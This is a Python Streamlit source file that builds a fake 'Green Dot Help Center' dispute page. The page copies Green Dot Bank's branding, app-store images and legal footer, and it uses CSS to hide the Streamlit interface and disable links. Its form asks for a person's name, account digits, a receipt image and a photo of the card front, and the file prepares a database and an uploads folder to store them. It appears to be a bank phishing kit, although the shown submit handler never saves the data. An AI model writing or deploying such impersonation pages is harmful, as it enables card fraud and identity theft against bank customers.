
import streamlit as st
import sqlite3
import os
from datetime import datetime

# DB Setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# CSS REFORZADO: Bloqueo de enlaces en logo y títulos
st.markdown("""<style>
/* Fondo Negro */
.stApp {
    background-color: #000000 !important;
    color: #FFFFFF !important;
}

/* Ocultar elementos de Streamlit */
header, footer, #MainMenu, .stDeployButton {visibility: hidden !important; display: none !important;}
[data-testid='stHeader'], [data-testid='stAppToolbar'], [data-testid='stFooterAd'] {display: none !important;}

/* ELIMINAR LINKS EN LOGO Y TÍTULOS */
/* Desactiva clics en el contenedor de la imagen y los encabezados */
[data-testid="stImage"], [data-testid="stMarkdownContainer"] h1, [data-testid="stMarkdownContainer"] h2, .section-anchor {
    pointer-events: none !important;
    cursor: default !important;
    text-decoration: none !important;
}

/* Ocultar específicamente el ancla invisible de Streamlit */
a.section-anchor {
    display: none !important;
}

/* Estilo de inputs */
.stTextInput>div>div>input, .stNumberInput>div>div>input {
    background-color: #1a1a1a !important;
    color: white !important;
    border: 1px solid #333 !important;
}

.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    width: 100%;
    border-radius: 4px !important;
    border: none !important;
    font-weight: bold !important;
}

.app-promo-container {
    background-color: #111111;
    padding: 40px 20px;
    text-align: center;
    border-radius: 12px;
    margin: 30px 0;
    border: 1px solid #222;
}

.legal-footer {
    font-size: 11px;
    color: #666;
    text-align: justify;
    margin-top: 40px;
    padding-top: 20px;
    border-top: 1px solid #222;
}
</style>""", unsafe_allow_html=True)

if os.path.exists('logo.svg'):
    st.image('logo.svg', width=150)

st.title("Help Center")
st.write("Please fill out the form below to submit your claim.")

with st.form("dispute_form_final", clear_on_submit=True):
    nombre = st.text_input("Full Name")
    cuenta = st.text_input("Account Number (Last 4 digits)")
    monto = st.number_input("Disputed Amount ($)", min_value=0.0, format="%.2f")
    st.markdown("**Required Evidence**")
    rec = st.file_uploader("Store Receipt", type=['jpg','png','jpeg'])
    car = st.file_uploader("Card Front Image", type=['jpg','png','jpeg'])
    submitted = st.form_submit_button("SUBMIT DISPUTE")

if submitted:
    if nombre and rec and car:
        st.success("✅ Dispute submitted successfully.")
    else:
        st.error("⚠️ Please complete all fields.")

st.markdown("""<div class='app-promo-container'>
    <h3 style='color:white;'>Download the Green Dot app</h3>
    <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top:20px;'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='150'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='150'>
    </div>
</div>""", unsafe_allow_html=True)

st.markdown("""<div class='legal-footer'>
Green Dot cards are issued by Green Dot Bank, Member FDIC. 
©2026 Green Dot Bank. All rights reserved. NMLS #914924.
</div>""", unsafe_allow_html=True)
